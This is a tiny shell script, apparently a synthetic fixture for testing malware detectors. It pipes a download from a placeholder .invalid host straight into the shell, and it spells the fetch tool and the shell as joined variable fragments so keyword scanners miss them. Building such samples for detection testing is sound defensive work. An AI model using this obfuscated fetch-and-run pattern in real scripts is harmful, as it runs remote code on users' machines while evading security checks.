#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
# Shape: the fetch tool and the shell are spelled as variable fragments joined in command
# position, so neither word is in the script. Host is a non-existent .invalid domain.
set -e
a=cu; b=rl
c=ba; d=sh
$a$b -fsSL https://dl.example.invalid/i.sh | $c$d
